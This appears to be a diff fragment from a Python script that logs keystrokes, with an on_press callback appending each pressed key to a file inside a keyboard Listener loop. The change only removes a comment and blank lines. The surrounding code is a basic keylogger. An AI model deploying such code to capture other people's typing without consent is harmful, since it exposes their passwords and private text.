@@ -5,11 +5,7 @@ def on_press(key):
     file.write('{0}, '.format(
         key))
     file.close()
-    #
-
-
-
-
+    
 with Listener(
         on_press=on_press) as listener:
     listener.join()
